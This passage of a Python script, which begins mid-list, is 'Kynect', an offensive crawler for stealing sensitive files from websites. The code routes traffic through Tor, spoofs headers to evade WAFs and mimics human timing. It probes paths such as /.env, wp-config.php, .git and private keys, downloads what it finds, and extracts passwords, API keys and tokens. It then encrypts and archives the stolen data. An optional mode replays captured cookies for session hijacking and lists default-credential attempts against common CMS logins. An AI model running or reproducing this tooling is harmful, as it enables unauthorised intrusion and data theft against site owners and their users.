    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/160.0.7534.45 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/161.0.7556.23 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_9 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.9 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/162.0.7578.56 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/114.0.1823.37 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.10 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:146.0) Gecko/20100101 Firefox/146.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/163.0.7590.34 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/164.0.7601.45 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:147.0) Gecko/20100101 Firefox/147.0",
    "Mozilla/5.0 (iPad; CPU OS 17_10 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.10 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/165.0.7623.56 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/115.0.1901.183 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/166.0.7645.23 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:148.0) Gecko/20100101 Firefox/148.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:149.0) Gecko/20100101 Firefox/149.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/167.0.7667.34 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/168.0.7689.45 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:149.0) Gecko/20100101 Firefox/149.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_11 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.11 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/169.0.7712.56 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/116.0.1938.54 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.12 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:150.0) Gecko/20100101 Firefox/150.0",
]

# Ekstensi file yang diincar
FILE_EXTENSIONS = [
    '.pdf', '.txt', '.sql', '.doc', '.docx', '.zip', '.rar', '.bak', '.conf', '.log',
    '.json', '.xml', '.csv', '.db', '.sqlite', '.tar', '.gz', '.php', '.asp', '.aspx',
    '.bak.sql', '.backup', '.old', '.temp', '.tmp', '.yaml', '.yml', '.ini', '.bak.gz'
]

# Direktori sensitif dan path cerdas
SENSITIVE_PATHS = [
    '/backup', '/admin', '/config', '/database', '/logs', '/private', '/secret', '/uploads',
    '/backup.sql', '/db_backup', '/admin/login.php', '/.env', '/config.php', '/wp-config.php',
    '/api/v1', '/api/key', '/.git', '/server-status', '/phpinfo.php', '/adminer.php',
    '/data', '/backups', '/archive', '/test', '/dev', '/staging', '/.htaccess',
    '/config.inc.php', '/settings.php', '/db.conf', '/backup.tar.gz', '/admin-panel',
    '/api/v2', '/config.json', '/backup.zip', '/db.sql', '/private.key', '/config.yaml'
]

# Manajemen kunci enkripsi
def load_or_generate_key(key_file="kynect.key"):
    if os.path.exists(key_file):
        with open(key_file, 'rb') as f:
            return f.read()
    key = Fernet.generate_key()
    with open(key_file, 'wb') as f:
        f.write(key)
    return key

ENCRYPTION_KEY = load_or_generate_key()
CIPHER = Fernet(ENCRYPTION_KEY)

def signal_handler(sig, frame):
    print(f"\n{Fore.RED}[!] Crawling stopped by user.{Fore.RESET}")
    logger.info("Crawling stopped by user")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

def check_tor_connection():
    try:
        for proc in psutil.process_iter(['name']):
            if proc.info['name'].lower() == 'tor':
                logger.info("Tor process detected")
                return True
        response = requests.get('https://check.torproject.org/api/ip', timeout=5)
        is_tor = response.json().get('IsTor', False)
        logger.info(f"Tor connection: {'Connected' if is_tor else 'Not connected'}")
        return is_tor
    except Exception as e:
        logger.error(f"Tor check failed: {str(e)}")
        return False

def enumerate_subdomains(domain, depth=5):
    subdomains = [
        'www', 'admin', 'dev', 'test', 'api', 'staging', 'backup', 'mail', 'db', 'login',
        'secure', 'app', 'portal', 'auth', 'dashboard', 'files', 'data', 'server', 'web',
        'vpn', 'git', 'ftp', 'ssh', 'cdn', 'blog', 'shop', 'forum', 'panel', 'cms'
    ]
    found_subdomains = []
    
    for _ in range(depth):
        for sub in tqdm(subdomains, desc=f"{Fore.YELLOW}Enumerating subdomains (depth {_+1}){Fore.RESET}", unit="subdomain"):
            try:
                full_domain = f"{sub}.{domain}"
                answers = dns.resolver.resolve(full_domain, 'A')
                for rdata in answers:
                    found_subdomains.append(full_domain)
                    logger.info(f"Found subdomain: {full_domain}")
                    subdomains.append(f"sub{sub}.{full_domain}")
            except Exception:
                pass
            time.sleep(random.uniform(0.3, 1.2))
    
    return list(set(found_subdomains))

def detect_technology(url):
    try:
        headers = {
            'User-Agent': random.choice(USER_AGENTS),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate'
        }
        response = requests.get(url, headers=headers, timeout=10)
        server = response.headers.get('Server', 'Unknown')
        cms = 'Unknown'
        content = response.text.lower()
        if 'wordpress' in content:
            cms = 'WordPress'
            logger.info("Detected CMS: WordPress")
        elif 'drupal' in content:
            cms = 'Drupal'
            logger.info("Detected CMS: Drupal")
        elif 'joomla' in content:
            cms = 'Joomla'
            logger.info("Detected CMS: Joomla")
        elif 'laravel' in content:
            cms = 'Laravel'
            logger.info("Detected CMS: Laravel")
        elif 'magento' in content:
            cms = 'Magento'
            logger.info("Detected CMS: Magento")
        return {'server': server, 'cms': cms}
    except Exception as e:
        logger.error(f"Failed to detect technology for {url}: {str(e)}")
        return {'server': 'Unknown', 'cms': 'Unknown'}

def try_session_hijacking(url, cookies, exploit=False):
    if not exploit:
        return False
    try:
        headers = {
            'User-Agent': random.choice(USER_AGENTS),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        }
        response = requests.get(url, headers=headers, cookies=cookies, timeout=10)
        if 'dashboard' in response.text.lower() or 'admin' in response.text.lower():
            logger.info(f"Session hijack succeeded at {url}")
            print(f"{Fore.GREEN}[+] Session hijack at {url}{Fore.RESET}")
            return True
        return False
    except Exception as e:
        logger.error(f"Session hijack failed for {url}: {str(e)}")
        return False

def try_basic_exploits(url, tech, exploit=False):
    if not exploit:
        return []
    exploits = []
    default_creds = [
        ('admin', 'admin'),
        ('admin', 'password'),
        ('root', 'root'),
        ('admin', '123456'),
        ('user', 'user')
    ]
    if tech['cms'] == 'WordPress':
        for user, pwd in default_creds:
            exploits.append(f"Trying WordPress at {url}/wp-login.php with {user}:{pwd}")
            logger.info(f"Trying WordPress creds: {user}:{pwd}")
    elif tech['cms'] == 'Drupal':
        for user, pwd in default_creds:
            exploits.append(f"Trying Drupal at {url}/user/login with {user}:{pwd}")
            logger.info(f"Trying Drupal creds: {user}:{pwd}")
    elif tech['cms'] == 'Joomla':
        for user, pwd in default_creds:
            exploits.append(f"Trying Joomla at {url}/administrator with {user}:{pwd}")
            logger.info(f"Trying Joomla creds: {user}:{pwd}")
    elif tech['cms'] == 'Magento':
        for user, pwd in default_creds:
            exploits.append(f"Trying Magento at {url}/admin with {user}:{pwd}")
            logger.info(f"Trying Magento creds: {user}:{pwd}")
    return exploits

def analyze_file_content(file_path):
    try:
        with open(file_path, 'r', errors='ignore') as f:
            content = f.read().lower()
            findings = []
            patterns = {
                'password': r'password\s*=\s*["\']?([^"\']+)["\']?',
                'api_key': r'api_key\s*=\s*["\']?([^"\']+)["\']?',
                'email': r'[\w\.-]+@[\w\.-]+\.\w+',
                'db_config': r'db_\w+\s*=\s*["\']?([^"\']+)["\']?',
                'secret': r'secret\s*=\s*["\']?([^"\']+)["\']?',
                'token': r'token\s*=\s*["\']?([^"\']+)["\']?'
            }
            for key, pattern in patterns.items():
                matches = re.findall(pattern, content)
                if matches:
                    findings.append(f"{key.capitalize()}: {matches}")
                    logger.info(f"Found {key} in {file_path}: {matches}")
            return findings
    except Exception as e:
        logger.error(f"Failed to analyze {file_path}: {str(e)}")
        return []

def safe_save(file_url, output_dir, source_url):
    try:
        filename = urllib.parse.quote(os.path.basename(file_url), safe='')
        if not filename:
            filename = f"file_{uuid.uuid4().hex[:8]}"
        safe_path = os.path.join(output_dir, filename)
        return safe_path
    except Exception as e:
        logger.error(f"Failed to generate safe filename for {file_url}: {str(e)}")
        return None

def encrypt_and_compress(file_path, output_dir, manifest):
    try:
        file_hash = verify_file_integrity(file_path)
        with open(file_path, 'rb') as f:
            data = f.read()
        encrypted_data = CIPHER.encrypt(data)
        encrypted_path = os.path.join(output_dir, f"{os.path.basename(file_path)}.enc")
        with open(encrypted_path, 'wb') as f:
            f.write(encrypted_data)
        
        zip_path = os.path.join(output_dir, f"dump_archive_{uuid.uuid4().hex[:8]}.zip")
        with zipfile.ZipFile(zip_path, 'a', zipfile.ZIP_DEFLATED) as zipf:
            zipf.write(encrypted_path, os.path.basename(encrypted_path))
        
        manifest.append({
            "original_file": file_path,
            "encrypted_file": encrypted_path,
            "zip_file": zip_path,
            "hash": file_hash,
            "timestamp": datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        })
        
        logger.info(f"Encrypted and compressed: {zip_path}")
        print(f"{Fore.CYAN}[+] Encrypted and compressed: {zip_path}{Fore.RESET}")
        return encrypted_path
    except Exception as e:
        logger.error(f"Failed to encrypt/compress {file_path}: {str(e)}")
        return None

def save_manifest(manifest, output_dir):
    manifest_file = os.path.join(output_dir, f"manifest_{uuid.uuid4().hex[:8]}.json")
    with open(manifest_file, 'w') as f:
        json.dump(manifest, f, indent=4)
    logger.info(f"Manifest saved: {manifest_file}")
    print(f"{Fore.CYAN}[+] Manifest saved: {manifest_file}{Fore.RESET}")

def download_file(file_url, output_dir, source_url, rate_limiter, manifest):
    try:
        headers = {
            'User-Agent': random.choice(USER_AGENTS),
            'Accept': '*/*',
            'Accept-Encoding': 'gzip, deflate'
        }
        with rate_limiter:
            response = requests.get(file_url, headers=headers, stream=True, timeout=10)
        
        if response.status_code == 200:
            safe_path = safe_save(file_url, output_dir, source_url)
            if not safe_path:
                return None
            with open(safe_path, 'wb') as f:
                for chunk in response.iter_content(chunk_size=8192):
                    if chunk:
                        f.write(chunk)
            logger.info(f"Downloaded: {safe_path} from {source_url}")
            print(f"{Fore.GREEN}[+] Downloaded: {safe_path} (Source: {source_url}){Fore.RESET}")
            return safe_path
        else:
            logger.error(f"Failed to download {file_url}: Status {response.status_code}")
            return None
    except Exception as e:
        logger.error(f"Error downloading {file_url}: {str(e)}")
        return None

def generate_html_dashboard(report, output_dir):
    html_content = f"""
    <html>
    <head>
        <title>Kynect Report</title>
        <style>
            body {{ font-family: monospace; background: #1a1a1a; color: #00ff00; margin: 0; padding: 20px; }}
            .container {{ max-width: 1000px; margin: auto; padding: 20px; background: #222; border-radius: 10px; box-shadow: 0 0 15px rgba(0,255,0,0.5); }}
            h1 {{ text-align: center; font-size: 30px; text-transform: uppercase; letter-spacing: 2px; }}
            .file-list, .findings {{ margin: 20px 0; padding: 15px; background: #333; border-radius: 5px; box-shadow: 0 0 10px rgba(0,255,0,0.3); }}
            a {{ color: #00ff00; text-decoration: none; }}
            a:hover {{ text-decoration: underline; }}
            .stats {{ display: flex; justify-content: space-between; font-size: 16px; margin-bottom: 20px; background: #2a2a2a; padding: 10px; border-radius: 5px; }}
            .stats p {{ margin: 0; }}
            ul {{ list-style: none; padding: 0; }}
            li {{ margin: 10px 0; font-size: 14px; }}
            .footer {{ text-align: center; margin-top: 20px; font-size: 12px; color: #00cc00; }}
        </style>
    </head>
    <body>
        <div class="container">
            <h1>Kynect Report</h1>
            <p><strong>Domain:</strong> {report['domain']}</p>
            <div class="stats">
                <p><strong>Total Files:</strong> {report['total_files']}</p>
                <p><strong>Subdomains:</strong> {len(report['subdomains'])}</p>
                <p><strong>Execution Time:</strong> {report['execution_time']}</p>
            </div>
            <h2>Subdomains</h2>
            <ul>
                {''.join([f'<li>{sub}</li>' for sub in report['subdomains']])}
            </ul>
            <h2>Files Found</h2>
            <div class="file-list">
                {''.join([f'<p><a href="{file["url"]}">{file["url"]}</a> (Source: {file["source"]})</p>' for file in report['reports'][0]['files']])}
            </div>
            <h2>Findings</h2>
            <div class="findings">
                {''.join([f'<p>{finding}</p>' for finding in report['reports'][0]['findings']])}
            </div>
            <div class="footer">Generated by Kynect - Author: Mr. Front-X from TovRant</div>
        </div>
    </body>
    </html>
    """
    dashboard_path = os.path.join(output_dir, f"dashboard_{uuid.uuid4().hex[:8]}.html")
    with open(dashboard_path, 'w') as f:
        f.write(html_content)
    logger.info(f"HTML dashboard saved: {dashboard_path}")
    webbrowser.open(f"file://{os.path.abspath(dashboard_path)}")

def save_report(report, output_dir):
    report_file = os.path.join(output_dir, f"report_{uuid.uuid4().hex[:8]}.json")
    with open(report_file, 'w') as f:
        json.dump(report, f, indent=4)
    logger.info(f"JSON report saved: {report_file}")
    print(f"{Fore.CYAN}[+] JSON report saved: {report_file}{Fore.RESET}")
    
    text_report = os.path.join(output_dir, f"report_{uuid.uuid4().hex[:8]}.txt")
    with open(text_report, 'w') as f:
        f.write(f"Kynect Report\n")
        f.write(f"Domain: {report['domain']}\n")
        f.write(f"Total Files: {report['total_files']}\n")
        f.write(f"Execution Time: {report['execution_time']}\n")
        f.write("Subdomains:\n")
        for sub in report['subdomains']:
            f.write(f" - {sub}\n")
        f.write("\nFiles Found:\n")
        for file in report['reports'][0]['files']:
            f.write(f" - {file['url']} (Source: {file['source']})\n")
        f.write("\nFindings:\n")
        for finding in report['reports'][0]['findings']:
            f.write(f" - {finding}\n")
    logger.info(f"Text report saved: {text_report}")
    print(f"{Fore.CYAN}[+] Text report saved: {text_report}{Fore.RESET}")

def play_notification():
    print(f"{Fore.MAGENTA}[*] NOTIFICATION: Significant finding detected!{Fore.RESET}")

def display_help():
    print(f"{Fore.MAGENTA}{figlet.renderText('Kynect')}{Fore.RESET}")
    print(f"{Fore.YELLOW}Author: Mr. Front-X from TovRant{Fore.RESET}")
    print("""
Kynect - Advanced Web Crawler for Sensitive File Discovery

Usage: python3 kynect.py [options]

Options:
  -d, --domain <domain>       Target domain to crawl (e.g., example.com)
                              Required. Specifies the domain for file discovery.

  -O, --only                  Crawl only the specified domain
                              Disables subdomain enumeration for focused crawling.

  -S, --save <path>           Output directory for saving dumps
                              Defines where files, reports, and manifest are stored.

  -A, --all                   Crawl all subdomains of the base domain
                              Cannot be combined with --only.

  --exploit                   Enable active exploitation (session hijacking, default creds)
                              Default: Off. Enables potentially intrusive actions.

  --spoof-headers             Enable aggressive header spoofing (e.g., GoogleBot, X-Forwarded-For)
                              Default: Off. Adds advanced spoofing for bypassing WAFs.

  --rate <requests/sec>       Set request rate limit (default: 5 req/s)
                              Controls requests per second to avoid rate limiting.

  --threads <number>          Set number of concurrent threads (default: 5)
                              Controls parallelism for crawling.

  --yes                       Run in non-interactive mode, auto-proceed without prompts
                              Enables automation by bypassing interactive confirmations.

  -help                       Display this help message and exit

Description:
  Kynect is a robust web crawler designed for discovering sensitive files and subdomains.
  It uses controlled crawling with rate limiting, supports encryption for stored files,
  and generates detailed JSON, text, and HTML reports. The tool is optimized for reliability,
  reproducibility, and predictable behavior, with optional aggressive features gated behind
  explicit flags.

Examples:
  python3 kynect.py -d example.com -S /path/to/save
    Crawl example.com and save results to /path/to/save.

  python3 kynect.py -d example.com -O --yes
    Crawl only example.com without subdomains, non-interactively.

  python3 kynect.py -A -d example.com -S /path/to/save --rate 10 --threads 8
    Crawl example.com and subdomains with 10 req/s and 8 threads.

  python3 kynect.py -d example.com --exploit --spoof-headers
    Crawl with active exploitation and aggressive header spoofing.

Requirements:
  Install dependencies using: pip install -r requirements.txt
  Required libraries: requests, beautifulsoup4, tqdm, psutil, cryptography, dnspython,
  colorama, pyfiglet

Notes:
  - Tor is recommended for anonymity; use --yes for CI/automation.
  - Files are encrypted with a persistent key (kynect.key) and stored with a manifest.
  - Logs are rotated and saved in the 'logs' directory.
""")
    sys.exit(0)

def create_output_dir(domain, save_path=None):
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    if save_path:
        output_dir = os.path.join(save_path, f"dump_{domain}_{timestamp}")
    else:
        output_dir = f"dump_{domain}_{timestamp}"
    os.makedirs(output_dir, exist_ok=True)
    logger.info(f"Output directory created: {output_dir}")
    return output_dir

def validate_domain(domain):
    if not domain:
        print(f"{Fore.RED}[!] Error: Domain is required{Fore.RESET}")
        sys.exit(1)
    if not re.match(r'^(https?://)?[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', domain):
        print(f"{Fore.RED}[!] Error: Invalid domain format{Fore.RESET}")
        sys.exit(1)
    if not domain.startswith(('http://', 'https://')):
        domain = 'http://' + domain
    return domain

def validate_file_path(path):
    try:
        if not os.path.exists(path):
            os.makedirs(path)
        if not os.access(path, os.W_OK):
            raise PermissionError(f"No write permission for {path}")
        return path
    except Exception as e:
        logger.error(f"Invalid save path {path}: {str(e)}")
        print(f"{Fore.RED}[!] Invalid save path {path}: {str(e)}{Fore.RESET}")
        sys.exit(1)

def check_requirements():
    required_libraries = [
        'requests', 'beautifulsoup4', 'tqdm', 'psutil', 'cryptography',
        'dnspython', 'colorama', 'pyfiglet'
    ]
    missing = []
    for lib in required_libraries:
        try:
            __import__(lib)
        except ImportError:
            missing.append(lib)
    if missing:
        print(f"{Fore.RED}[!] Missing required libraries: {', '.join(missing)}{Fore.RESET}")
        print(f"{Fore.YELLOW}[*] Install them using: pip install -r requirements.txt{Fore.RESET}")
        sys.exit(1)

def generate_summary_stats(report):
    stats = {
        "total_subdomains": len(report["subdomains"]),
        "total_files": report["total_files"],
        "sensitive_findings": len([f for r in report["reports"] for f in r["findings"]]),
        "execution_time": report["execution_time"],
        "cms_detected": list(set(r["tech"]["cms"] for r in report["reports"] if r["tech"]["cms"] != "Unknown")),
        "servers_detected": list(set(r["tech"]["server"] for r in report["reports"] if r["tech"]["server"] != "Unknown"))
    }
    return stats

def export_summary_stats(stats, output_dir):
    summary_file = os.path.join(output_dir, f"summary_{uuid.uuid4().hex[:8]}.txt")
    with open(summary_file, 'w') as f:
        f.write("Kynect Summary Statistics\n")
        f.write(f"Total Subdomains: {stats['total_subdomains']}\n")
        f.write(f"Total Files Found: {stats['total_files']}\n")
        f.write(f"Sensitive Findings: {stats['sensitive_findings']}\n")
        f.write(f"Execution Time: {stats['execution_time']}\n")
        f.write(f"CMS Detected: {', '.join(stats['cms_detected']) or 'None'}\n")
        f.write(f"Servers Detected: {', '.join(stats['servers_detected']) or 'None'}\n")
    logger.info(f"Summary stats saved: {summary_file}")
    print(f"{Fore.CYAN}[+] Summary stats saved: {summary_file}{Fore.RESET}")

def clean_up_temp_files(output_dir):
    try:
        for file in os.listdir(output_dir):
            if not file.endswith(('.enc', '.zip', '.json', '.txt', '.html')):
                os.remove(os.path.join(output_dir, file))
                logger.info(f"Cleaned up temporary file: {file}")
    except Exception as e:
        logger.error(f"Failed to clean up temp files: {str(e)}")

def rate_limit_check(response):
    if response.status_code == 429:
        logger.warning("Rate limit detected, pausing for 60 seconds")
        print(f"{Fore.YELLOW}[!] Rate limit detected, pausing for 60 seconds{Fore.RESET}")
        time.sleep(60)
        return True
    return False

def simulate_human_behavior():
    time.sleep(random.uniform(1.5, 4.0))
    if random.random() < 0.1:
        time.sleep(random.uniform(5.0, 10.0))
        logger.info("Simulating longer human-like pause")

def spoof_headers():
    return {
        'User-Agent': random.choice(USER_AGENTS),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Referer': random.choice(['https://www.google.com', 'https://www.bing.com', 'https://www.yahoo.com']),
        'Accept-Language': 'en-US,en;q=0.5',
        'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
        'Cache-Control': 'no-cache',
        'DNT': '1',
        'Upgrade-Insecure-Requests': '1'
    }

def verify_file_integrity(file_path, expected_hash=None):
    try:
        sha256_hash = hashlib.sha256()
        with open(file_path, 'rb') as f:
            for byte_block in iter(lambda: f.read(4096), b""):
                sha256_hash.update(byte_block)
        file_hash = sha256_hash.hexdigest()
        if expected_hash and file_hash != expected_hash:
            logger.error(f"File integrity check failed for {file_path}")
            print(f"{Fore.RED}[!] File integrity check failed for {file_path}{Fore.RESET}")
            return False
        logger.info(f"File integrity verified: {file_path}")
        return file_hash
    except Exception as e:
        logger.error(f"Failed to verify file integrity for {file_path}: {str(e)}")
        return None

def log_request(url, response):
    """Mencatat detail permintaan HTTP."""
    log_entry = {
        "timestamp": datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        "url": url,
        "status_code": response.status_code,
        "headers": dict(response.headers),
        "content_length": len(response.content)
    }
    logger.info(f"Request log: {json.dumps(log_entry, indent=2)}")

class RateLimiter:
    """Kelas untuk mengatur rate limiting."""
    def __init__(self, rate_limit):
        self.rate_limit = rate_limit
        self.tokens = rate_limit
        self.last_refill = time.time()
        self.lock = threading.Lock()

    def _refill(self):
        now = time.time()
        elapsed = now - self.last_refill
        new_tokens = elapsed * self.rate_limit
        with self.lock:
            self.tokens = min(self.rate_limit, self.tokens + new_tokens)
            self.last_refill = now

    def acquire(self):
        self._refill()
        with self.lock:
            if self.tokens >= 1:
                self.tokens -= 1
                return True
            time.sleep(1 / self.rate_limit)
            self.tokens -= 1
            return True

def crawl_and_dump(url, output_dir, depth=5, rate_limiter=None, exploit=False, spoof_headers_flag=False, manifest=None):
    """Perayapan cerdas dengan rate limiting dan penanganan WAF."""
    print(f"{Fore.YELLOW}[*] Crawling: {url} (Depth: {depth}){Fore.RESET}")
    found_files = []
    report = {"url": url, "files": [], "findings": [], "tech": detect_technology(url)}
    
    urls_to_check = [url] + [urllib.parse.urljoin(url, path) for path in SENSITIVE_PATHS]
    for year in range(2020, 2026):
        urls_to_check.extend([
            urllib.parse.urljoin(url, f"/backup_{year}.sql"),
            urllib.parse.urljoin(url, f"/archive_{year}.zip"),
            urllib.parse.urljoin(url, f"/data_{year}.tar.gz"),
            urllib.parse.urljoin(url, f"/config_{year}.yaml")
        ])
    
    cookies = {}
    visited_urls = set()
    
    for _ in range(depth):
        for check_url in tqdm(urls_to_check, desc=f"{Fore.YELLOW}Crawling depth {_+1}{Fore.RESET}", unit="url"):
            if check_url in visited_urls:
                continue
            visited_urls.add(check_url)
            try:
                headers = spoof_headers() if spoof_headers_flag else {
                    'User-Agent': random.choice(USER_AGENTS),
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Encoding': 'gzip, deflate'
                }
                with rate_limiter.acquire():
                    response = requests.get(check_url, headers=headers, timeout=10, allow_redirects=True)
                log_request(check_url, response)
                
                if rate_limit_check(response):
                    continue
                
                if response.status_code == 200:
                    soup = BeautifulSoup(response.text, 'html.parser')
                    links = soup.find_all('a', href=True)
                    
                    cookies.update(response.cookies.get_dict())
                    
                    for link in links:
                        href = link['href']
                        if any(ext in href.lower() for ext in FILE_EXTENSIONS):
                            file_url = urllib.parse.urljoin(check_url, href)
                            file_path = download_file(file_url, output_dir, check_url, rate_limiter, manifest)
                            if file_path:
                                file_hash = verify_file_integrity(file_path)
                                if file_hash:
                                    found_files.append((file_url, check_url))
                                    report["files"].append({"url": file_url, "source": check_url, "hash": file_hash})
                                    findings = analyze_file_content(file_path)
                                    if findings:
                                        report["findings"].extend(findings)
                                        threading.Thread(target=play_notification).start()
                                    encrypt_and_compress(file_path, output_dir, manifest)
                    
                    for link in links:
                        new_url = urllib.parse.urljoin(check_url, link['href'])
                        if new_url not in visited_urls and url in new_url:
                            urls_to_check.append(new_url)
                
                if cookies and exploit:
                    if try_session_hijacking(check_url, cookies, exploit):
                        report["findings"].append(f"Session hijack at {check_url}")
                
                if exploit:
                    exploits = try_basic_exploits(check_url, report['tech'], exploit)
                    report["findings"].extend(exploits)
                
                simulate_human_behavior()
            
            except Exception as e:
                logger.error(f"Failed to crawl {check_url}: {str(e)}")
                print(f"{Fore.RED}[!] Failed to crawl {check_url}: {str(e)}{Fore.RESET}")
    
    clean_up_temp_files(output_dir)
    return found_files, report

def main():
    check_requirements()
    parser = argparse.ArgumentParser(add_help=False)
    parser.add_argument('-d', '--domain', type=str, help='Target domain')
    parser.add_argument('-O', '--only', action='store_true', help='Crawl only specified domain')
    parser.add_argument('-S', '--save', type=str, help='Output directory')
    parser.add_argument('-A', '--all', action='store_true', help='Crawl all related domains')
    parser.add_argument('--exploit', action='store_true', help='Enable active exploitation')
    parser.add_argument('--spoof-headers', action='store_true', help='Enable aggressive header spoofing')
    parser.add_argument('--rate', type=float, default=5.0, help='Request rate limit (req/s)')
    parser.add_argument('--threads', type=int, default=5, help='Number of concurrent threads')
    parser.add_argument('--yes', action='store_true', help='Non-interactive mode')
    parser.add_argument('-help', action='store_true', help='Show help message')
    
    args = parser.parse_args()
    
    if args.help or not args.domain:
        display_help()
    
    if args.only and args.all:
        print(f"{Fore.RED}[!] Error: Cannot combine -O and -A{Fore.RESET}")
        sys.exit(1)
    
    domain = validate_domain(args.domain)
    if args.save:
        validate_file_path(args.save)
    
    if not check_tor_connection() and not args.yes:
        print(f"{Fore.RED}[!] WARNING: Tor connection not detected! Enable Tor for maximum stealth.{Fore.RESET}")
        proceed = input(f"{Fore.YELLOW}Continue without Tor? (y/n): {Fore.RESET}").lower()
        if proceed != 'y':
            print(f"{Fore.RED}[*] Exiting program.{Fore.RESET}")
            sys.exit(0)
    
    output_dir = create_output_dir(domain.split('/')[2], args.save)
    print(f"{Fore.CYAN}[*] Dump results will be saved to: {output_dir}{Fore.RESET}")
    
    print(f"{Fore.MAGENTA}{figlet.renderText('Kynect')}{Fore.RESET}")
    print(f"{Fore.YELLOW}Author: Mr. Front-X from TovRant{Fore.RESET}")
    print(f"{Fore.CYAN}Starting Kynect at: {datetime.now().strftime('%H:%M:%S %d-%m-%Y')}{Fore.RESET}\n")
    
    subdomains = [domain]
    if not args.only:
        print(f"{Fore.YELLOW}[*] Enumerating subdomains for {domain}{Fore.RESET}")
        subdomains = enumerate_subdomains(domain.split('/')[2]) + [domain]
    
    start_time = datetime.now()
    print(f"{Fore.CYAN}[*] Start time: {start_time}{Fore.RESET}")
    
    all_found_files = []
    all_reports = []
    manifest = []
    rate_limiter = RateLimiter(args.rate)
    
    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = [
            executor.submit(crawl_and_dump, sub, output_dir, 5, rate_limiter, args.exploit, args.spoof_headers, manifest)
            for sub in subdomains
        ]
        for future in futures:
            found_files, report = future.result()
            all_found_files.extend(found_files)
            all_reports.append(report)
            if found_files:
                threading.Thread(target=play_notification).start()
    
    save_manifest(manifest, output_dir)
    
    execution_time = str(datetime.now() - start_time)
    combined_report = {
        "domain": domain,
        "subdomains": subdomains,
        "total_files": len(all_found_files),
        "execution_time": execution_time,
        "reports": all_reports
    }
    save_report(combined_report, output_dir)
    stats = generate_summary_stats(combined_report)
    export_summary_stats(stats, output_dir)
    generate_html_dashboard(combined_report, output_dir)
    
    end_time = datetime.now()
    print(f"\n{Fore.CYAN}[*] Crawling finished at: {end_time}{Fore.RESET}")
    print(f"{Fore.CYAN}[*] Total files found: {len(all_found_files)}{Fore.RESET}")
    print(f"{Fore.CYAN}[*] Files saved to: {output_dir}{Fore.RESET}")
    
    if all_found_files:
        print(f"\n{Fore.GREEN}List of found files:{Fore.RESET}")
        for file_url, source_url in all_found_files:
            print(f" - {file_url} (Source: {source_url})")
    else:
        print(f"{Fore.RED}[!] No sensitive files found.{Fore.RESET}")

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        logger.error(f"Main error: {str(e)}")
        print(f"{Fore.RED}[!] Main error: {str(e)}{Fore.RESET}")
        sys.exit(1)